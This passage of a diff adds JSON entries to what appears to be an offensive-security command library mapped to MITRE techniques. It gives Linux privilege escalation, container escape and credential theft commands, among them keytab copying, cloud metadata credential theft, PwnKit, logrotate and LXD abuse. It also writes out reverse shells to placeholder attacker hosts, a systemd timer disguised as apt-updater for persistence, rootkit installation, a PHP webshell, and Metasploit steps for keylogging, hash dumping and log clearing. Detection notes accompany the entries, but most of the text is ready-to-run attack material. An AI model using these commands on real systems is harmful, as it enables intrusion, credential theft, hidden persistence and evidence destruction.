+        "command": "klist -k /etc/krb5.keytab && cp /etc/krb5.keytab /tmp/loot.keytab"
+      },
+      {
+        "description": "Enumerate domain users and groups from Linux via SSSD.",
+        "method": "shell",
+        "command": "getent passwd | grep -v '/nologin' | grep -v '/false'; getent group; id {domain_user}@{domain}"
+      },
+      {
+        "description": "Use stolen keytab to authenticate as service account.",
+        "method": "shell",
+        "command": "kinit -k -t /tmp/loot.keytab {principal}@{DOMAIN} && klist"
+      },
+      {
+        "description": "SSSD offline cache dump — contains cached domain credentials.",
+        "method": "shell",
+        "command": "ls /var/lib/sss/db/ && strings /var/lib/sss/db/cache_{domain}.ldb | grep -A2 'userPassword\\|cachedPassword'"
+      }
+    ],
+    "prerequisites": "Linux host joined to AD domain; SSSD/Winbind/Kerberos configured",
+    "opsec": "Linux AD-joined systems store Kerberos tickets in /tmp/krb5cc_*. libnss-ldap/sssd cache credentials. kinit for ticket acquisition.",
+    "detection_ref": "AD Event 4768/4769 from Linux sources; Kerberos ticket monitoring; SSSD cache file auditing; AD Linux host anomaly detection"
+  },
+  "linux_containers_host": {
+    "description": "Attacking Docker/Podman hosts from compromised container perspective.",
+    "mitre": "T1611",
+    "commands": [
+      {
+        "description": "Abuse Podman rootless socket for host access.",
+        "method": "shell",
+        "command": "export DOCKER_HOST=unix:///run/user/{uid}/podman/podman.sock && podman info && podman run --rm -v /:/host alpine cat /host/etc/shadow"
+      },
+      {
+        "description": "Exploit containerd socket if exposed.",
+        "method": "shell",
+        "command": "ctr -a /var/run/containerd/containerd.sock containers list && ctr -a /var/run/containerd/containerd.sock run --privileged docker.io/library/alpine:latest pwn /bin/sh"
+      },
+      {
+        "description": "Read host files via Docker volume mount abuse.",
+        "method": "docker",
+        "command": "docker run --rm -v /etc:/host_etc alpine cat /host_etc/shadow"
+      },
+      {
+        "description": "Find all Docker socket locations on host.",
+        "method": "shell",
+        "command": "find / -name 'docker.sock' -o -name 'containerd.sock' -o -name 'podman.sock' 2>/dev/null"
+      },
+      {
+        "description": "NSEnter to switch namespaces and access host from container.",
+        "method": "shell",
+        "command": "nsenter -t 1 -m -u -i -n -p -- bash  # Must be privileged or have CAP_SYS_PTRACE"
+      }
+    ],
+    "prerequisites": "Container host with accessible Docker daemon; or container with host mounts",
+    "opsec": "Host bind mounts in containers allow direct host filesystem access. nsenter with root PID to escape namespace. /proc/1/root for namespace escape.",
+    "detection_ref": "Container host mount audit; nsenter detection; Falco host filesystem access from container; container security policies"
+  },
+  "linux_rootkit_detection_evasion": {
+    "description": "Installing and evading rootkit detection on Linux systems.",
+    "mitre": "T1014",
+    "commands": [
+      {
+        "description": "Check for existing rootkits with rkhunter.",
+        "method": "rkhunter",
+        "command": "rkhunter --check --skip-keypress --report-warnings-only"
+      },
+      {
+        "description": "Check for rootkits with chkrootkit.",
+        "method": "chkrootkit",
+        "command": "chkrootkit -q"
+      },
+      {
+        "description": "LD_PRELOAD rootkit — intercept system calls via shared library.",
+        "method": "shell",
+        "command": "echo '/tmp/evil.so' > /etc/ld.so.preload  # evil.so hooks: opendir, readdir, stat to hide files/processes"
+      },
+      {
+        "description": "Kernel module rootkit installation.",
+        "method": "shell",
+        "command": "insmod rootkit.ko && lsmod | grep rootkit  # Typical rootkit hides itself from lsmod output"
+      },
+      {
+        "description": "Detect hidden processes by comparing /proc with ps output.",
+        "method": "shell",
+        "command": "diff <(ls /proc | grep '^[0-9]' | sort) <(ps aux | awk 'NR>1{print $2}' | sort) | grep '^<'  # PIDs in /proc but not ps = hidden"
+      }
+    ],
+    "prerequisites": "Root access; kernel module compilation or prebuilt module",
+    "opsec": "Kernel rootkit hides files, processes, and network connections from user space. LKM rootkits require kernel symbol table access. Use with extreme caution.",
+    "detection_ref": "Kernel module audit (lsmod); RKHunter/Chkrootkit; kernel integrity checking; IMA (Integrity Measurement Architecture); Secure Boot for module signing"
+  },
+  "polkit_dbus_abuse": {
+    "description": "Exploit PolicyKit (polkit) and D-Bus for local privilege escalation — CVE-2021-4034 (PwnKit) and D-Bus service abuse.",
+    "mitre": "T1068",
+    "commands": [
+      {
+        "description": "Check polkit version for CVE-2021-4034 (PwnKit) vulnerability",
+        "command": "pkexec --version\ndpkg -l policykit-1 2>/dev/null || rpm -q polkit 2>/dev/null",
+        "method": "Bash"
+      },
+      {
+        "description": "Exploit CVE-2021-4034 PwnKit for root",
+        "command": "git clone https://github.com/berdav/CVE-2021-4034.git && cd CVE-2021-4034 && make && ./cve-2021-4034",
+        "method": "PwnKit Exploit"
+      },
+      {
+        "description": "Enumerate D-Bus services for privilege escalation",
+        "command": "busctl list\nbusctl tree org.freedesktop.PolicyKit1\ndbus-send --system --print-reply --dest=org.freedesktop.PolicyKit1 /org/freedesktop/PolicyKit1/Authority org.freedesktop.DBus.Introspectable.Introspect",
+        "method": "busctl/dbus-send"
+      },
+      {
+        "description": "Check for misconfigured D-Bus services allowing privileged method calls",
+        "command": "find /etc/dbus-1/system.d/ -name '*.conf' | xargs grep -l 'allow' | xargs grep -A2 'allow'",
+        "method": "Bash"
+      },
+      {
+        "description": "Abuse gdbus to call privileged D-Bus methods",
+        "command": "gdbus call --system --dest org.freedesktop.hostname1 --object-path /org/freedesktop/hostname1 --method org.freedesktop.hostname1.SetHostname 'pwned' true",
+        "method": "gdbus"
+      }
+    ],
+    "prerequisites": "Low-privilege user; polkit installed and vulnerable version; D-Bus accessible",
+    "opsec": "Polkit CVEs (PwnKit CVE-2021-4034, CVE-2021-3560) provide root escalation from any user. Very reliable on unpatched systems.",
+    "detection_ref": "Polkit version patching; auditd polkit authentication events; process creation monitoring for privilege escalation from polkit context"
+  },
+  "cloud_metadata_imds_exploitation": {
+    "description": "Steal cloud credentials from Instance Metadata Service (IMDS) endpoints on AWS, Azure, and GCP to escalate privileges or move laterally in cloud environments.",
+    "mitre": "T1552.005",
+    "commands": [
+      {
+        "description": "AWS IMDSv1 — retrieve IAM role credentials (no token required)",
+        "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>",
+        "method": "curl/AWS IMDSv1"
+      },
+      {
+        "description": "AWS IMDSv2 — get session token first, then credentials",
+        "command": "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ -H \"X-aws-ec2-metadata-token: $TOKEN\"",
+        "method": "curl/AWS IMDSv2"
+      },
+      {
+        "description": "Azure IMDS — retrieve access token for management API",
+        "command": "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
+        "method": "curl/Azure IMDS"
+      },
+      {
+        "description": "Use stolen AWS credentials to enumerate IAM identity",
+        "command": "export AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\naws sts get-caller-identity",
+        "method": "AWS CLI"
+      }
+    ],
+    "prerequisites": "Code execution on cloud VM; metadata service accessible at 169.254.169.254",
+    "opsec": "Cloud metadata provides instance credentials, SSH keys, and startup scripts. No authentication required (IMDSv1). Request specific paths to minimize API calls.",
+    "detection_ref": "Cloud-specific metadata access monitoring; IMDSv2 enforcement (AWS); workload identity (GCP/AKS); metadata network access restrictions"
+  },
+  "linux_credential_hunting": {
+    "description": "Hunt for credentials on Linux systems — SSH keys, bash history, .env files, config files, and credential manager databases.",
+    "mitre": "T1552.001",
+    "commands": [
+      {
+        "description": "Find all private SSH keys on the system",
+        "command": "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v proc",
+        "method": "Bash"
+      },
+      {
+        "description": "Search bash/zsh history for credentials and passwords",
+        "command": "cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|secret|token|key|credential|api'",
+        "method": "Bash"
+      },
+      {
+        "description": "Find .env files with potential secrets",
+        "command": "find / -name '.env' -o -name '.env.*' 2>/dev/null | xargs grep -lE 'PASSWORD|SECRET|TOKEN|API_KEY' 2>/dev/null",
+        "method": "Bash"
+      },
+      {
+        "description": "Grep configuration files for credentials",
+        "command": "grep -riE '(password|passwd|pass|secret|token|api_key)\\s*[=:]\\s*[^$]' /etc /opt /var/www /home 2>/dev/null | grep -v '#'",
+        "method": "Bash"
+      },
+      {
+        "description": "Run LaZagne for comprehensive credential extraction",
+        "command": "python3 laZagne.py all 2>/dev/null",
+        "method": "LaZagne"
+      },
+      {
+        "description": "Find database connection strings",
+        "command": "grep -riE '(mysql|postgres|mongodb|redis)://[^\\s]+' /var/www /opt /home 2>/dev/null",
+        "method": "Bash"
+      }
+    ],
+    "prerequisites": "Low-privilege shell; read access to user directories and common credential locations",
+    "opsec": "Systematically check: ~/.ssh/id_*, ~/.aws/credentials, ~/.gcloud/, .env files, /etc/passwd+shadow, application config files. No tools needed.",
+    "detection_ref": "File access monitoring for credential paths; auditd key access events; secret detection in code repositories; credential hygiene training"
+  },
+  "systemd_timer_persistence": {
+    "description": "Create malicious systemd service + timer units for persistent execution that mimics legitimate system maintenance tasks",
+    "mitre": "T1053.006",
+    "prerequisites": "Root or ability to write to user systemd directories (~/.config/systemd/user/) for user-level persistence",
+    "opsec": "Blend unit names with system names (e.g., apt-daily-upgrade.timer). User-level timers don't require root. Timer units survive reboots automatically.",
+    "detection_ref": "Monitor /etc/systemd/system/ and ~/.config/systemd/user/ for new .service/.timer files; systemctl list-timers; journalctl for unit execution",
+    "commands": [
+      {
+        "method": "bash",
+        "description": "Create systemd service and timer for persistence",
+        "command": "# Create malicious service unit\ncat > /etc/systemd/system/apt-updater.service << 'EOF'\n[Unit]\nDescription=APT Package Update Helper\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\nEOF\n\n# Create timer unit (runs every hour)\ncat > /etc/systemd/system/apt-updater.timer << 'EOF'\n[Unit]\nDescription=APT Package Update Timer\n\n[Timer]\nOnBootSec=5min\nOnUnitActiveSec=1h\n\n[Install]\nWantedBy=timers.target\nEOF\n\nsystemctl daemon-reload\nsystemctl enable --now apt-updater.timer\n\n# User-level (no root needed)\nmkdir -p ~/.config/systemd/user/\n# ... same files in ~/.config/systemd/user/\nsystemctl --user enable --now apt-updater.timer"
+      }
+    ]
+  },
+  "cap_sys_admin_abuse": {
+    "description": "Exploit CAP_SYS_ADMIN capability (or other dangerous Linux capabilities) to escape containers, mount filesystems, or escalate to root",
+    "mitre": "T1611",
+    "prerequisites": "Process/container with CAP_SYS_ADMIN, CAP_NET_ADMIN, CAP_SYS_PTRACE, or CAP_DAC_READ_SEARCH capabilities",
+    "opsec": "Capability abuse is highly technique-specific. Mounting host filesystem or injecting into processes generates kernel audit events (auditd). Container escapes leave traces in host logs.",
+    "detection_ref": "Audit capability usage via auditd (cap_sys_admin syscalls); Falco rules for sensitive mounts; container security policies (AppArmor/Seccomp)",
+    "commands": [
+      {
+        "method": "bash",
+        "description": "Check capabilities and mount host filesystem",
+        "command": "# Check own capabilities\ncapsh --print\ncat /proc/self/status | grep Cap\ncapsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')\n\n# CAP_SYS_ADMIN: mount host filesystem from container\nmkdir /tmp/host\nmount /dev/sda1 /tmp/host\nchroot /tmp/host\n\n# CAP_SYS_PTRACE: inject shellcode into host process\n# (requires ptrace on a host-namespace process)\npython3 -c \"\nimport ctypes, sys, os\npid = int(sys.argv[1])\nctypes.CDLL(None).ptrace(16, pid, 0, 0)  # PTRACE_ATTACH\n\" HOST_PID"
+      },
+      {
+        "method": "bash",
+        "description": "Find binaries with dangerous capabilities",
+        "command": "# Find all files with elevated capabilities\ncapsh --print\nfind / -xdev 2>/dev/null | xargs getcap 2>/dev/null\n\n# Common dangerous caps\n# cap_setuid: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n# cap_net_bind_service: bind to port < 1024\n# cap_dac_override: bypass file read/write permissions"
+      }
+    ]
+  },
+  "logrotate_privesc": {
+    "description": "Exploit misconfigured logrotate to write attacker-controlled files as root, via race conditions in log file creation or postrotate script injection",
+    "mitre": "T1574",
+    "prerequisites": "Write access to log directory used by logrotate; logrotate running as root (default); or write access to logrotate config",
+    "opsec": "Logrotten exploit requires a specific race window. Config injection is quieter but requires write to /etc/logrotate.d/. Both are triggered by the next logrotate execution.",
+    "detection_ref": "Monitor /etc/logrotate.d/ and /etc/logrotate.conf for modifications; inotify watches on log directories; File integrity monitoring (FIM) on logrotate configs",
+    "commands": [
+      {
+        "method": "logrotten",
+        "description": "Exploit logrotate race condition for root shell",
+        "command": "# Compile logrotten exploit\ngit clone https://github.com/whotwagner/logrotten && cd logrotten\ngcc logrotten.c -o logrotten\n\n# Trigger: write to log file that logrotate will rotate\n# Payload writes to postrotate script\npayload='if [ `id -u` -eq 0 ]; then (/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\" &); fi'\necho $payload > /tmp/payload\n\n# Run exploit (will execute payload when logrotate runs)\n./logrotten -p /tmp/payload /path/to/writable/logfile.log\n\n# Trigger logrotate manually (if cron not immediate)\nlogrotate -f /etc/logrotate.conf"
+      }
+    ]
+  },
+  "lxd_container_escape": {
+    "description": "Privilege escalation via LXD/LXC container — if user is in lxd group, create privileged container mounting host filesystem.",
+    "mitre": "T1611",
+    "commands": [
+      {
+        "description": "Initialize LXD (if not already done).",
+        "method": "shell",
+        "command": "lxd init"
+      },
+      {
+        "description": "Import Alpine Linux image for container.",
+        "method": "lxc",
+        "command": "lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine"
+      },
+      {
+        "description": "Create privileged LXD container.",
+        "method": "lxc",
+        "command": "lxc init alpine r00t -c security.privileged=true"
+      },
+      {
+        "description": "Mount host filesystem inside container.",
+        "method": "lxc",
+        "command": "lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true"
+      },
+      {
+        "description": "Start the container.",
+        "method": "lxc",
+        "command": "lxc start r00t"
+      },
+      {
+        "description": "Execute shell inside container to access host files.",
+        "method": "lxc",
+        "command": "lxc exec r00t /bin/sh"
+      },
+      {
+        "description": "Read host /etc/shadow from mounted volume.",
+        "method": "shell",
+        "command": "cat /mnt/root/etc/shadow"
+      }
+    ],
+    "prerequisites": "Current user in lxd or sudo group; LXD installed; Alpine image available",
+    "opsec": "LXD container creation leaves persistent container — clean up after exploitation. Requires building Alpine image beforehand.",
+    "detection_ref": "lxd group membership audit; container creation monitoring; Falco for privileged container operations; audit lxc command execution"
+  },
+  "nfs_privesc": {
+    "description": "Exploiting NFS shares with no_root_squash for privilege escalation — mount NFS share and create SUID binary.",
+    "mitre": "T1548.001",
+    "commands": [
+      {
+        "description": "Show NFS export list on target.",
+        "method": "showmount",
+        "command": "showmount -e {target_ip}"
+      },
+      {
+        "description": "Mount NFS share locally.",
+        "method": "shell",
+        "command": "sudo mount -t nfs {target_ip}:/tmp /mnt"
+      },
+      {
+        "description": "Create SUID bash copy on NFS share (requires no_root_squash).",
+        "method": "shell",
+        "command": "cp /bin/bash /mnt/tmp && chmod +s /mnt/tmp/bash"
+      },
+      {
+        "description": "Shared tmux session for multi-user session hijacking.",
+        "method": "tmux",
+        "command": "tmux -S /shareds new -s debugsess"
+      }
+    ],
+    "prerequisites": "NFS share accessible; no_root_squash configured on export; mount utilities available",
+    "opsec": "NFS no_root_squash allows root on client to create SUID files. Check /etc/exports for misconfiguration.",
+    "detection_ref": "NFS server access logging; no_root_squash disablement; SUID file creation monitoring; inotify on NFS exports"
+  },
+  "shell_stabilization": {
+    "description": "Upgrade and stabilize dumb/raw shells to fully interactive TTYs with job control and tab completion.",
+    "mitre": "T1059.004",
+    "commands": [
+      {
+        "description": "Start netcat listener to catch incoming reverse shell.",
+        "method": "netcat",
+        "command": "nc -lvnp 1234"
+      },
+      {
+        "description": "Linux bash reverse shell one-liner.",
+        "method": "shell",
+        "command": "bash -c 'bash -i >& /dev/tcp/{attacker_ip}/1234 0>&1'"
+      },
+      {
+        "description": "mkfifo reverse shell alternative.",
+        "method": "shell",
+        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} 1234 >/tmp/f"
+      },
+      {
+        "description": "Start bind shell on remote server.",
+        "method": "shell",
+        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f"
+      },
+      {
+        "description": "Upgrade shell TTY with Python pty (step 1).",
+        "method": "shell",
+        "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+      },
+      {
+        "description": "Upgrade shell TTY with Python3 pty (step 1).",
+        "method": "shell",
+        "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+      },
+      {
+        "description": "Fully interactive TTY upgrade — background, fix stty, foreground (step 2).",
+        "method": "shell",
+        "command": "# After python pty.spawn:\n# Press: Ctrl+Z\nstty raw -echo\nfg\n# Press Enter twice"
+      },
+      {
+        "description": "Create PHP webshell file on target.",
+        "method": "shell",
+        "command": "echo '<?php system($_GET[\"cmd\"]);?>' > /var/www/html/shell.php"
+      },
+      {
+        "description": "Execute command via uploaded PHP webshell.",
+        "method": "curl",
+        "command": "curl http://{target_ip}:{port}/shell.php?cmd=id"
+      },
+      {
+        "description": "Add attacker SSH public key to root authorized_keys (persistence).",
+        "method": "shell",
+        "command": "ssh-keygen -f key\necho \"$(cat key.pub)\" >> /root/.ssh/authorized_keys\nssh root@{target_ip} -i key"
+      },
+      {
+        "description": "Transfer files to remote server with wget.",
+        "method": "shell",
+        "command": "wget http://{attacker_ip}:8000/linpeas.sh"
+      },
+      {
+        "description": "Start Python HTTP server to serve files.",
+        "method": "shell",
+        "command": "python3 -m http.server 8000"
+      },
+      {
+        "description": "Transfer file to remote server with scp.",
+        "method": "shell",
+        "command": "scp linpeas.sh user@{target_ip}:/tmp/linpeas.sh"
+      }
+    ],
+    "prerequisites": "Code execution on target; network connectivity to attacker; netcat or curl available",
+    "opsec": "Python pty upgrade leaves no artifact but changes TERM settings. Avoid writing files to disk unless necessary. mkfifo shells are process-in-memory. SSH key persistence leaves authorized_keys modification.",
+    "detection_ref": "Process monitoring for pty.spawn; FIFO file creation in /tmp; authorized_keys modification auditing; netcat listener detection; EDR shell spawn detection"
+  },
+  "metasploit_framework": {
+    "description": "Core MSFconsole and Meterpreter commands for exploit delivery, session management, and post-exploitation.",
+    "mitre": "T1059.004",
+    "commands": [
+      {
+        "description": "Launch Metasploit Framework console.",
+        "method": "msfconsole",
+        "command": "msfconsole"
+      },
+      {
+        "description": "Search for exploits or modules by name/keyword.",
+        "method": "msfconsole",
+        "command": "search {name_or_cve}"
+      },
+      {
+        "description": "Load an exploit or module.",
+        "method": "msfconsole",
+        "command": "use {module_path}\n# Example: use windows/smb/psexec"
+      },
+      {
+        "description": "Show required options for loaded module.",
+        "method": "msfconsole",
+        "command": "show options"
+      },
+      {
+        "description": "Set module option value.",
+        "method": "msfconsole",
+        "command": "set RHOSTS {target_ip}\nset LHOST {attacker_ip}\nset LPORT {port}"
+      },
+      {
+        "description": "Set option globally across all modules.",
+        "method": "msfconsole",
+        "command": "setg LHOST {attacker_ip}"
+      },
+      {
+        "description": "Show available payloads for loaded module.",
+        "method": "msfconsole",
+        "command": "show payloads"
+      },
+      {
+        "description": "Set the payload to use.",
+        "method": "msfconsole",
+        "command": "set payload {payload_path}\n# Example: set payload windows/x64/meterpreter/reverse_tcp"
+      },
+      {
+        "description": "Show supported target platforms and OS versions.",
+        "method": "msfconsole",
+        "command": "show targets\nset target {number}"
+      },
+      {
+        "description": "Check if target is vulnerable before exploiting.",
+        "method": "msfconsole",
+        "command": "check"
+      },
+      {
+        "description": "Execute the exploit against the target.",
+        "method": "msfconsole",
+        "command": "exploit\n# or: run"
+      },
+      {
+        "description": "Run exploit as background job.",
+        "method": "msfconsole",
+        "command": "exploit -j"
+      },
+      {
+        "description": "List all active sessions.",
+        "method": "msfconsole",
+        "command": "sessions -l"
+      },
+      {
+        "description": "Interact with a specific session.",
+        "method": "msfconsole",
+        "command": "sessions -i {session_id}"
+      },
+      {
+        "description": "Upgrade a shell session to Meterpreter.",
+        "method": "msfconsole",
+        "command": "sessions -u {session_id}"
+      },
+      {
+        "description": "Execute command on all live Meterpreter sessions.",
+        "method": "msfconsole",
+        "command": "sessions -c {command}"
+      },
+      {
+        "description": "Kill all active sessions.",
+        "method": "msfconsole",
+        "command": "sessions -K"
+      },
+      {
+        "description": "Run nmap scan and store results in MSF database.",
+        "method": "msfconsole",
+        "command": "db_nmap -sV -sC {target_ip}"
+      },
+      {
+        "description": "Meterpreter: get system information on target.",
+        "method": "Meterpreter",
+        "command": "sysinfo"
+      },
+      {
+        "description": "Meterpreter: list running processes with owner accounts.",
+        "method": "Meterpreter",
+        "command": "ps"
+      },
+      {
+        "description": "Meterpreter: migrate to another process for stability/privilege.",
+        "method": "Meterpreter",
+        "command": "migrate {pid}"
+      },
+      {
+        "description": "Meterpreter: attempt privilege escalation to SYSTEM.",
+        "method": "Meterpreter",
+        "command": "getsystem"
+      },
+      {
+        "description": "Meterpreter: dump all password hashes on target.",
+        "method": "Meterpreter",
+        "command": "hashdump"
+      },
+      {
+        "description": "Meterpreter: load incognito for token impersonation.",
+        "method": "Meterpreter",
+        "command": "use incognito\nlist_tokens -u\nimpersonate_token \"DOMAIN\\\\Username\""
+      },
+      {
+        "description": "Meterpreter: upload file to target.",
+        "method": "Meterpreter",
+        "command": "upload /local/path/file.exe C:\\\\Windows\\\\Temp\\\\file.exe"
+      },
+      {
+        "description": "Meterpreter: download file from target.",
+        "method": "Meterpreter",
+        "command": "download C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt /tmp/"
+      },
+      {
+        "description": "Meterpreter: start keylogger on target.",
+        "method": "Meterpreter",
+        "command": "keyscan_start\n# Later:\nkeyscan_dump\nkeyscan_stop"
+      },
+      {
+        "description": "Meterpreter: take screenshot of target desktop.",
+        "method": "Meterpreter",
+        "command": "screenshot"
+      },
+      {
+        "description": "Meterpreter: background current session.",
+        "method": "Meterpreter",
+        "command": "background"
+      },
+      {
+        "description": "Meterpreter: drop to interactive shell on target.",
+        "method": "Meterpreter",
+        "command": "shell"
+      },
+      {
+        "description": "Meterpreter: clear Windows event logs (anti-forensics).",
+        "method": "Meterpreter",
+        "command": "clearev"
+      },
+      {
+        "description": "Meterpreter: modify file timestamps (anti-forensics).",
+        "method": "Meterpreter",
+        "command": "timestomp {file} -z \"01/01/2020 00:00:00\""
+      },
+      {
+        "description": "Meterpreter: add user on remote target.",
+        "method": "Meterpreter",
+        "command": "add_user {username} {password} -h {target_ip}"
+      },
+      {
+        "description": "Meterpreter: add user to Domain Admins group.",
+        "method": "Meterpreter",
+        "command": "add_group_user \"Domain Admins\" {username} -h {target_ip}"
+      },
+      {
+        "description": "Auto-migrate to new process on successful exploitation.",
+        "method": "msfconsole",
+        "command": "set autorunscript migrate -f"
+      }
+    ],
+    "prerequisites": "Metasploit Framework installed; target vulnerable to selected module; network connectivity; LHOST reachable from target for reverse shells",
+    "opsec": "Meterpreter is in-memory; avoid writing to disk. Use encrypted payloads (HTTPS). Migrate away from unstable processes early. clearev and timestomp are detectable by SIEM — use selectively.",
+    "detection_ref": "EDR Meterpreter signatures; AMSI detection of MSF payloads; network IDS for Meterpreter traffic patterns; process migration detection; event log clearing alerts"
+  }
+}
